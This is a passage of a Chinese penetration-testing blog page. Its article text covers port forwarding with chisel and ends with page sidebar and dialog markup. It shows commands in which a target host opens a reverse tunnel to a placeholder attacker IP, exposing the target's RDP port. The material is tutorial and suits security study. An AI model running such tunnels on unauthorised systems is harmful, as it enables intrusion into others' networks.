root@靶机IP&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;区别是隧道搭建时是靶机连攻击机，ssh是攻击机连靶机&lt;/p&gt;\n&lt;h1 id=\&quot;chisel\&quot;&gt;chisel&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#chisel\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;工具下载链接：\n&lt;a href=\&quot;https://github.com/jpillora/chisel\&quot;&gt;https://github.com/jpillora/chisel&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;攻击机执行&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;chisel server -p 12138 –reverse&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/182.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;\n靶机执行&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;chisel client 公网攻击机IP:12138 R:1234:127.0.0.1:3389&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/183.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;\n建立成功后，攻击机连接本机1234端口即可访问靶机3389\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/184.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;iptables&quot;],&quot;text&quot;:[0,&quot;iptables&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;lcx&quot;],&quot;text&quot;:[0,&quot;lcx&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;msf&quot;],&quot;text&quot;:[0,&quot;msf&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;netsh&quot;],&quot;text&quot;:[0,&quot;netsh&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;ssf&quot;],&quot;text&quot;:[0,&quot;ssf&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;ssh&quot;],&quot;text&quot;:[0,&quot;ssh&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;invoke-socksproxy&quot;],&quot;text&quot;:[0,&quot;Invoke-SocksProxy&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;ligolo&quot;],&quot;text&quot;:[0,&quot;Ligolo&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;chisel&quot;],&quot;text&quot;:[0,&quot;chisel&quot;]}]]],&quot;localImagePaths&quot;:[1,[]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;端口映射和转发&quot;],&quot;date&quot;:[3,&quot;2026-01-23T10:36:57.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;端口转发&quot;],[0,&quot;映射&quot;],[0,&quot;代理&quot;],[0,&quot;proxy&quot;]]],&quot;categories&quot;:[1,[[0,&quot;Penetration&quot;],[0,&quot;内网和域&quot;]]]}],&quot;imagePaths&quot;:[1,[]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/28&quot;]}]}" ssr client="load" opts="{&quot;name&quot;:&quot;HomeSiderPanel&quot;,&quot;value&quot;:true}" await-children><link rel="preload" as="image" href="/img/avatar.webp" fetchPriority="high"/><div class="cursor-pointer rounded-sm bg-black/8 p-1 font-semibold backdrop-blur-lg select-none my-4 flex w-full justify-between text-sm/6"><div class="flex-center relative cursor-pointer gap-1.5 px-3 py-1 first:rounded-l-xs last:rounded-r-xs opacity-50 grow"><span class="flex-center shrink-0"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="w-4 h-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M12 2C17.5228 2 22 6.47715 22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12C2 6.47715 6.47715 2 12 2ZM12 4C7.58172 4 4 7.58172 4 12C4 16.4183 7.58172 20 12 20C16.4183 20 20 16.4183 20 12C20 7.58172 16.4183 4 12 4ZM15.8329 7.33748C16.0697 7.17128 16.3916 7.19926 16.5962 7.40381C16.8002 7.60784 16.8267 7.92955 16.6587 8.16418C14.479 11.2095 13.2796 12.8417 13.0607 13.0607C12.4749 13.6464 11.5251 13.6464 10.9393 13.0607C10.3536 12.4749 10.3536 11.5251 10.9393 10.9393C11.3126 10.5661 12.9438 9.36549 15.8329 7.33748ZM17.5 11C18.0523 11 18.5 11.4477 18.5 12C18.5 12.5523 18.0523 13 17.5 13C16.9477 13 16.5 12.5523 16.5 12C16.5 11.4477 16.9477 11 17.5 11ZM6.5 11C7.05228 11 7.5 11.4477 7.5 12C7.5 12.5523 7.05228 13 6.5 13C5.94772 13 5.5 12.5523 5.5 12C5.5 11.4477 5.94772 11 6.5 11ZM8.81802 7.40381C9.20854 7.79433 9.20854 8.4275 8.81802 8.81802C8.4275 9.20854 7.79433 9.20854 7.40381 8.81802C7.01328 8.4275 7.01328 7.79433 7.40381 7.40381C7.79433 7.01328 8.4275 7.01328 8.81802 7.40381ZM12 5.5C12.5523 5.5 13 5.94772 13 6.5C13 7.05228 12.5523 7.5 12 7.5C11.4477 7.5 11 7.05228 11 6.5C11 5.94772 11.4477 5.5 12 5.5Z"></path></svg></span></div><div class="flex-center relative cursor-pointer gap-1.5 px-3 py-1 first:rounded-l-xs last:rounded-r-xs opacity-50 grow"><span class="flex-center shrink-0"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="w-4 h-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M20 22H4C3.44772 22 3 21.5523 3 21V3C3 2.44772 3.44772 2 4 2H20C20.5523 2 21 2.44772 21 3V21C21 21.5523 20.5523 22 20 22ZM19 20V4H5V20H19ZM7 6H11V10H7V6ZM7 12H17V14H7V12ZM7 16H17V18H7V16ZM13 7H17V9H13V7Z"></path></svg></span></div><div class="flex-center relative cursor-pointer gap-1.5 px-3 py-1 first:rounded-l-xs last:rounded-r-xs text-primary-foreground grow"><span class="flex-center shrink-0"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="w-4 h-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M5.75024 3.5H4.71733L3.25 3.89317V5.44582L4.25002 5.17782L4.25018 8.5H3V10H7V8.5H5.75024V3.5ZM10 4H21V6H10V4ZM10 11H21V13H10V11ZM10 18H21V20H10V18ZM2.875 15.625C2.875 14.4514 3.82639 13.5 5 13.5C6.17361 13.5 7.125 14.4514 7.125 15.625C7.125 16.1106 6.96183 16.5587 6.68747 16.9167L6.68271 16.9229L5.31587 18.5H7V20H3.00012L2.99959 18.8786L5.4717 16.035C5.5673 15.9252 5.625 15.7821 5.625 15.625C5.625 15.2798 5.34518 15 5 15C4.67378 15 4.40573 15.2501 4.37747 15.5688L4.3651 15.875H2.875V15.625Z"></path></svg></span><span class="overflow-hidden whitespace-nowrap" style="width:auto;opacity:1">文章目录</span><div class="bg-gradient-shoka-button absolute inset-0 -z-10 rounded-sm" style="will-change:transform"></div></div></div><div class="vertical-scrollbar pt-10 scroll-gutter-stable relative block w-full flex-1 min-h-0 overflow-x-hidden overflow-y-auto md:pt-4 md:pl-3" data-type="post" data-default-type="directory"><div class="sider-slot" data-slot-type="info"><div class="flex flex-col items-center"><div class="h-40 w-40 rounded-full" style="background-image:linear-gradient(135deg, #9e8764 0%, #ae7b62 50%, #644235 100%)"><img class="shadow-card-darker hover:animate-shake h-full w-full rounded-full transition" src="/img/avatar.webp" alt="Kaguya avatar" loading="eager" fetchPriority="high"/></div><p class="mt-2">Kaguya</p><p class="text-muted-foreground mt-3 text-center">ACG / 养猫人 / 菜逼 / 黑客 / 臭美</p><div class="mt-2 grid grid-cols-3 gap-2"><div><a class="social-link flex-center group relative overflow-hidden rounded-xl px-1.5 py-1 transition-all duration-300 group-hover:scale-105" style="--link-color:#191717" data-platform="github" href="https://github.com/kaguyahi" title="GitHub" data-tooltip-interactive="false" data-tooltip-placement="top" aria-label="GitHub"><i class="fa-brands fa-github social-icon" aria-hidden="true"></i><span class="absolute inset-0 -z-10 -translate-x-full translate-y-full rounded-xl transition-transform duration-300 group-hover:translate-x-0 group-hover:translate-y-0"></span></a></div><div><a class="social-link flex-center group relative overflow-hidden rounded-xl px-1.5 py-1 transition-all duration-300 group-hover:scale-105" style="--link-color:#4b9ae4" data-platform="x" href="https://x.com/" title="X (推特)" data-tooltip-interactive="false" data-tooltip-placement="top" aria-label="X (推特)"><i class="fa-brands fa-x-twitter social-icon" aria-hidden="true"></i><span class="absolute inset-0 -z-10 -translate-x-full translate-y-full rounded-xl transition-transform duration-300 group-hover:translate-x-0 group-hover:translate-y-0"></span></a></div><div><a class="social-link flex-center group relative overflow-hidden rounded-xl px-1.5 py-1 transition-all duration-300 group-hover:scale-105" style="--link-color:#55acd5" data-platform="email" href="mailto:2517029339@qq.com" title="Email" data-tooltip-interactive="false" data-tooltip-placement="top" aria-label="Email"><i class="fa-regular fa-envelope social-icon" aria-hidden="true"></i><span class="absolute inset-0 -z-10 -translate-x-full translate-y-full rounded-xl transition-transform duration-300 group-hover:translate-x-0 group-hover:translate-y-0"></span></a></div></div><div class="text-muted-foreground mt-3 flex justify-center text-center text-sm/4 whitespace-nowrap select-none dark:text-white/80"><a href="/blog" class="hover:text-blue flex cursor-pointer flex-col gap-2 p-1 transition"><span class="text-lg/5 font-bold">29</span>文章</a><div class="bg-muted-foreground mx-3 w-px"></div><a href="/blog/categories" aria-label="分类" class="hover:text-blue"><p class="flex cursor-pointer flex-col gap-2 p-1 transition"><span class="text-lg/5 font-bold">7</span>分类</p></a><div class="bg-muted-foreground mx-3 w-px"></div><a href="/blog/tags" class="hover:text-blue flex cursor-pointer flex-col gap-2 p-1 transition"><span class="text-lg/5 font-bold">40</span>标签</a></div><div class="mt-6 flex w-full flex-col items-center gap-2.5"><a href="/blog" aria-label="文章" class="inline-flex items-center justify-center whitespace-nowrap ring-offset-background focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-gradient-shoka-button px-4 py-2 shoka-button-shadow h-12 w-40 rounded-xl text-base tracking-wider opacity-75 transition-all duration-300 hover:opacity-100 text-muted-foreground/80 hover:bg-muted-foreground/10 bg-none shadow-none hover:shadow-none"><i class="mr-1.5 fa-solid fa-pen-nib" aria-hidden="true"></i>文章</a><a href="/blog/categories" aria-label="分类" class="inline-flex items-center justify-center whitespace-nowrap ring-offset-background focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-gradient-shoka-button px-4 py-2 shoka-button-shadow h-12 w-40 rounded-xl text-base tracking-wider opacity-75 transition-all duration-300 hover:opacity-100 text-muted-foreground/80 hover:bg-muted-foreground/10 bg-none shadow-none hover:shadow-none"><i class="mr-1.5 fa-solid fa-layer-group" aria-hidden="true"></i>分类</a><a href="/blog/tags" aria-label="标签" class="inline-flex items-center justify-center whitespace-nowrap ring-offset-background focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-gradient-shoka-button px-4 py-2 shoka-button-shadow h-12 w-40 rounded-xl text-base tracking-wider opacity-75 transition-all duration-300 hover:opacity-100 text-muted-foreground/80 hover:bg-muted-foreground/10 bg-none shadow-none hover:shadow-none"><i class="mr-1.5 fa-solid fa-tags" aria-hidden="true"></i>标签</a><a href="/blog/archives" aria-label="归档" class="inline-flex items-center justify-center whitespace-nowrap ring-offset-background focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-gradient-shoka-button px-4 py-2 shoka-button-shadow h-12 w-40 rounded-xl text-base tracking-wider opacity-75 transition-all duration-300 hover:opacity-100 text-muted-foreground/80 hover:bg-muted-foreground/10 bg-none shadow-none hover:shadow-none"><i class="mr-1.5 fa-solid fa-solid fa-flag" aria-hidden="true"></i>归档</a><a href="/blog/friends" aria-label="友链" class="inline-flex items-center justify-center whitespace-nowrap ring-offset-background focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-gradient-shoka-button px-4 py-2 shoka-button-shadow h-12 w-40 rounded-xl text-base tracking-wider opacity-75 transition-all duration-300 hover:opacity-100 text-muted-foreground/80 hover:bg-muted-foreground/10 bg-none shadow-none hover:shadow-none"><i class="mr-1.5 fa-solid fa-link" aria-hidden="true"></i>友链</a><a href="/blog/about" aria-label="关于" class="inline-flex items-center justify-center whitespace-nowrap ring-offset-background focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-gradient-shoka-button px-4 py-2 shoka-button-shadow h-12 w-40 rounded-xl text-base tracking-wider opacity-75 transition-all duration-300 hover:opacity-100 text-muted-foreground/80 hover:bg-muted-foreground/10 bg-none shadow-none hover:shadow-none"><i class="mr-1.5 fa-solid fa-user" aria-hidden="true"></i>关于</a></div></div></div><div class="sider-slot hidden" data-slot-type="directory"><nav class="toc-container max-h-[90dvh] overflow-auto " aria-label="文章目录"><div class="space-y-1 pr-2"><div class="heading-tree-item relative"><a href="#windows安全标识符sid" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="Windows安全标识符SID"><span class="heading-text block flex-1 truncate leading-relaxed">Windows安全标识符SID</span></a></div><div class="heading-tree-item relative"><a href="#临时http服务架设" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="临时HTTP服务架设"><span class="heading-text block flex-1 truncate leading-relaxed">临时HTTP服务架设</span></a></div><div class="heading-tree-item relative"><a href="#cmd" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="Cmd"><span class="heading-text block flex-1 truncate leading-relaxed">Cmd</span></a></div><div class="heading-tree-item relative"><a href="#wmi" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="Wmi"><span class="heading-text block flex-1 truncate leading-relaxed">Wmi</span></a></div><div class="heading-tree-item relative"><a href="#wmi-1" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="Wmi"><span class="heading-text block flex-1 truncate leading-relaxed">Wmi</span></a></div><div class="heading-tree-item relative"><a href="#powershell基础操作" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="Powershell基础操作"><span class="heading-text block flex-1 truncate leading-relaxed">Powershell基础操作</span></a></div><div class="heading-tree-item relative"><a href="#powerview" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="Powerview"><span class="heading-text block flex-1 truncate leading-relaxed">Powerview</span></a></div><div class="heading-tree-item relative"><a href="#linux" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="Linux"><span class="heading-text block flex-1 truncate leading-relaxed">Linux</span></a></div><div class="heading-tree-item relative"><a href="#addomain" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="ADDomain"><span class="heading-text block flex-1 truncate leading-relaxed">ADDomain</span></a></div><div class="heading-tree-item relative"><a href="#bloodhoundad" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="BloodHoundAD"><span class="heading-text block flex-1 truncate leading-relaxed">BloodHoundAD</span></a></div></div></nav></div><div class="sider-slot hidden" data-slot-type="series"><div class="flex flex-col gap-1"><a href="/blog/post/29" class="group relative flex items-start gap-3 rounded-md px-1 py-2 transition-colors hover:bg-accent/50 text-primary font-medium"><span class="mt-2 h-2 w-2 shrink-0 rounded-full transition-colors bg-primary"></span><span class="line-clamp-2 flex-1 text-sm leading-relaxed transition-colors text-primary">内网信息获取</span></a><a href="/blog/post/28" class="group relative flex items-start gap-3 rounded-md px-1 py-2 transition-colors hover:bg-accent/50"><span class="mt-2 h-2 w-2 shrink-0 rounded-full transition-colors bg-muted-foreground/40 group-hover:bg-muted-foreground/60"></span><span class="line-clamp-2 flex-1 text-sm leading-relaxed transition-colors text-foreground group-hover:text-primary">端口映射和转发</span></a></div></div></div><div class="border-border mt-4 flex flex-col gap-3 border-t pt-4 md:mt-0 md:pt-2 w-full px-2"><div class="flex items-center justify-between gap-2"><div class="max-w-[45%] flex-1"></div><a href="/blog/post/28" class="group flex items-center gap-1.5 rounded-md px-2 py-1.5 transition-colors hover:bg-accent text-muted-foreground hover:text-primary max-w-[45%] min-w-0 flex-1 justify-end text-right" title="端口映射和转发"><span class="truncate text-xs">端口映射和转发</span><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="h-4 w-4 shrink-0" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M13.1717 12.0007L8.22192 7.05093L9.63614 5.63672L16.0001 12.0007L9.63614 18.3646L8.22192 16.9504L13.1717 12.0007Z"></path></svg></a></div><div class="flex justify-center gap-2"><button class="flex items-center justify-center gap-1.5 rounded-md px-3 py-1.5 transition-colors hover:bg-accent text-muted-foreground hover:text-primary text-xs" title="回到顶部" aria-label="回到顶部"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="h-4 w-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M11.9999 10.8284L7.0502 15.7782L5.63599 14.364L11.9999 8L18.3639 14.364L16.9497 15.7782L11.9999 10.8284Z"></path></svg>回到顶部</button><button class="flex items-center justify-center gap-1.5 rounded-md px-3 py-1.5 transition-colors hover:bg-accent text-muted-foreground hover:text-primary text-xs" title="滚到底部" aria-label="滚到底部"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="h-4 w-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M11.9999 13.1714L16.9497 8.22168L18.3639 9.63589L11.9999 15.9999L5.63599 9.63589L7.0502 8.22168L11.9999 13.1714Z"></path></svg>滚到底部</button></div></div><div class="mt-auto w-full rounded-full pt-4 sticky bottom-0"><div class="bg-primary h-1 origin-left rounded-full scale-x-0"></div></div><!--astro:end--></astro-island> </div> </astro-slot></div></div><!--astro:end--></astro-island> <!-- 遮罩层 --><div id="search-overlay" data-state="closed" class="fixed inset-0 z-40 bg-black/50 opacity-0 backdrop-blur-sm transition-opacity duration-200 data-[state=closed]:hidden" role="presentation" aria-hidden="true"></div> <!-- 搜索对话框 --> <div id="search-dialog" data-state="closed" class="fixed inset-0 z-50 grid place-items-center px-4 data-[state=closed]:hidden" role="dialog" aria-label="搜索文章" aria-modal="true"> <div id="search-dialog-content" class="bg-gradient-start shadow-box w-full max-w-3xl overflow-auto rounded-xl opacity-0 transition-all duration-200"> <div class="relative p-6 md:p-3"> <div class="search-dialog"> <!-- Header --> <div class="relative mb-4 flex items-center justify-between"> <h2 class="flex items-center gap-2 text-lg font-semibold md:text-base"> <i class="fa-solid fa-magnifying-glass text-base md:text-sm" aria-hidden="true"></i>
搜索文章
</h2> <button id="search-dialog-close" class="flex size-8 items-center justify-center rounded-full bg-black/5 transition-colors duration-300 hover:bg-black/10 md:size-7 dark:bg-white/10 dark:hover:bg-white/20" aria-label="关闭搜索"> <i class="fa-solid fa-xmark text-base md:text-sm" aria-hidden="true"></i> </button> </div> <div id="search-empty-hint" class="search-empty-hint absolute inset-x-0 top-32 text-center text-sm opacity-60 md:top-28"> <p>输入关键词搜索博客文章</p> <p class="mt-1 text-xs">
按 <kbd class="rounded bg-black/10 px-1.5 py-0.5 font-mono dark:bg-white/10">ESC</kbd> 关闭
</p> </div> <!-- Search Content Area --> <div class="vertical-scrollbar scroll-feather-mask -mx-6 h-[calc(80dvh-140px)] overflow-auto scroll-smooth px-6 pb-10 md:-mx-3 md:h-[calc(80dvh-120px)] md:px-3"> <!-- Search Container --> <div id="search-dialog-container"></div> </div> </div> <!-- Keyboard hints --> <div class="bg-background/2 absolute inset-x-0 bottom-0 z-10 flex items-center justify-center gap-4 px-4 pt-2 pb-4 text-xs text-black/50 dark:border-white/10 dark:text-white/50"> <span><kbd class="kbd">↑↓</kbd> 选择</span> <span><kbd class="kbd">Enter</kbd> 打开</span> <span><kbd class="kbd">ESC</kbd> 关闭</span> </div> </div> </div> </div> <script type="module" src="/_astro/SearchDialog.astro_astro_type_script_index_0_lang.B0CSJxN3.js"></script>  <!-- 遮罩层 --><div id="code-fullscreen-overlay" data-state="closed" class="fixed inset-0 z-40 bg-black/80 opacity-0 backdrop-blur-sm transition-opacity duration-200 data-[state=closed]:hidden" role="presentation" aria-hidden="true"></div> <!-- 代码全屏对话框 --> <div id="code-fullscreen-dialog" data-state="closed" class="fixed inset-0 z-50 grid place-items-center px-4 data-[state=closed]:hidden" role="dialog" aria-label="代码全屏预览" aria-modal="true"> <div id="code-fullscreen-content" class="bg-background relative flex h-[85vh] w-[90vw] max-w-6xl flex-col overflow-hidden rounded-xl opacity-0 shadow-2xl transition-opacity duration-200 md:max-w-[90vw]"> <!-- Toolbar --> <div class="border-border bg-muted/50 flex shrink-0 items-center justify-between border-b px-4 py-3 backdrop-blur-sm"> <div class="flex items-center gap-3"> <div class="flex gap-2"> <span class="h-3 w-3 rounded-full bg-[#ff5f56]"></span> <span class="h-3 w-3 rounded-full bg-[#ffbd2e]"></span> <span class="h-3 w-3 rounded-full bg-[#27c93f]"></span> </div> <span id="code-fullscreen-language" class="text-muted-foreground font-mono text-xs font-medium tracking-wider uppercase">
text
</span> </div> <div class="flex items-center gap-1"> <button id="code-fullscreen-copy" class="text-muted-foreground hover:bg-accent hover:text-accent-foreground flex items-center gap-2 rounded-md px-3 py-1.5 transition-colors"> <!-- Copy icon --> <svg id="code-fullscreen-copy-icon" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 448 512" fill="currentColor"> <path d="M192 0c-35.3 0-64 28.7-64 64l0 256c0 35.3 28.7 64 64 64l192 0c35.3 0 64-28.7 64-64l0-200.6c0-17.4-7.1-34.1-19.7-46.2L370.6 17.8C358.7 6.4 342.8 0 326.3 0L192 0zM64 128c-35.3 0-64 28.7-64 64L0 448c0 35.3 28.7 64 64 64l192 0c35.3 0 64-28.7 64-64l0-16-64 0 0 16-192 0 0-256 16 0 0-64-16 0z"></path> </svg> <!-- Checkmark icon (hidden by default) --> <svg id="code-fullscreen-check-icon" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="hidden"> <mask id="checkmark-anim-fullscreen"> <g fill="none" stroke="#fff" stroke-dasharray="24" stroke-dashoffset="24" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"> <path d="M2 13.5l4 4l10.75 -10.75"> <animate fill="freeze" attributeName="stroke-dashoffset" dur="0.4s" values="24;0"></animate> </path> <path stroke="#000" stroke-width="6" d="M7.5 13.5l4 4l10.75 -10.75"> <animate fill="freeze" attributeName="stroke-dashoffset" begin="0.4s" dur="0.4s" values="24;0"></animate> </path> <path d="M7.5 13.5l4 4l10.75 -10.75"> <animate fill="freeze" attributeName="stroke-dashoffset" begin="0.4s" dur="0.4s" values="24;0"></animate> </path> </g> </mask> <rect width="24" height="24" fill="currentColor" mask="url(#checkmark-anim-fullscreen)"></rect> </svg> <span id="code-fullscreen-copy-text" class="text-sm">复制</span> </button> <button id="code-fullscreen-close" class="text-muted-foreground hover:bg-accent hover:text-accent-foreground rounded-md p-2 transition-colors" aria-label="关闭"> <i class="fa-solid fa-xmark text-base" aria-hidden="true"></i> </button> </div> </div> <!-- Code Content --> <div class="scroll-feather-mask flex-1 overflow-auto"> <pre id="code-fullscreen-pre" class="p-4"><code id="code-fullscreen-code"></code></pre> </div> </div> </div> <script type="module" src="/_astro/CodeBlockFullscreen.astro_astro_type_script_index_0_lang.BUCnEfx7.js"></script> <!-- Overlay --><div id="mermaid-fullscreen-overlay" data-state="closed" class="fixed inset-0 z-40 bg-black/80 opacity-0 backdrop-blur-sm transition-opacity duration-200 data-[state=closed]:hidden" role="presentation" aria-hidden="true"></div> <!-- Mermaid Fullscreen Dialog --> <div id="mermaid-fullscreen-dialog" data-state="closed" class="fixed inset-0 z-50 grid place-items-center px-4 data-[state=closed]:hidden" role="dialog" aria-label="Mermaid diagram fullscreen" aria-modal="true"> <div id="mermaid-fullscreen-content" class="bg-background relative flex h-[85vh] w-[90vw] max-w-6xl flex-col overflow-hidden rounded-xl opacity-0 shadow-2xl transition-opacity duration-200 md:max-w-[90vw]"> <!-- Toolbar --> <div class="border-border bg-muted/50 flex shrink-0 items-center justify-between border-b px-4 py-3 backdrop-blur-sm"> <div class="flex items-center gap-3"> <div class="flex gap-2"> <span class="h-3 w-3 rounded-full bg-[#ff5f56]"></span> <span class="h-3 w-3 rounded-full bg-[#ffbd2e]"></span> <span class="h-3 w-3 rounded-full bg-[#27c93f]"></span> </div> <span class="text-muted-foreground font-mono text-xs font-medium tracking-wider uppercase"> mermaid </span> </div> <div class="flex items-center gap-1"> <!-- Zoom info --> <span id="mermaid-zoom-level" class="text-muted-foreground mr-2 text-sm">100%</span> <!-- Reset zoom button --> <button id="mermaid-fullscreen-reset" class="text-muted-foreground hover:bg-accent hover:text-accent-foreground flex items-center gap-2 rounded-md px-3 py-1.5 transition-colors" title="Reset zoom"> <i class="fa-solid fa-rotate-right text-sm" aria-hidden="true"></i> </button> <!-- Copy button --> <button id="mermaid-fullscreen-copy" class="text-muted-foreground hover:bg-accent hover:text-accent-foreground flex items-center gap-2 rounded-md px-3 py-1.5 transition-colors"> <svg id="mermaid-fullscreen-copy-icon" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 448 512" fill="currentColor"> <path d="M192 0c-35.3 0-64 28.7-64 64l0 256c0 35.3 28.7 64 64 64l192 0c35.3 0 64-28.7 64-64l0-200.6c0-17.4-7.1-34.1-19.7-46.2L370.6 17.8C358.7 6.4 342.8 0 326.3 0L192 0zM64 128c-35.3 0-64 28.7-64 64L0 448c0 35.3 28.7 64 64 64l192 0c35.3 0 64-28.7 64-64l0-16-64 0 0 16-192 0 0-256 16 0 0-64-16 0z"></path> </svg> <svg id="mermaid-fullscreen-check-icon" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="hidden"> <mask id="checkmark-anim-mermaid-fullscreen"> <g fill="none" stroke="#fff" stroke-dasharray="24" stroke-dashoffset="24" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"> <path d="M2 13.5l4 4l10.75 -10.75"> <animate fill="freeze" attributeName="stroke-dashoffset" dur="0.4s" values="24;0"></animate> </path> <path stroke="#000" stroke-width="6" d="M7.5 13.5l4 4l10.75 -10.75"> <animate fill="freeze" attributeName="stroke-dashoffset" begin="0.4s" dur="0.4s" 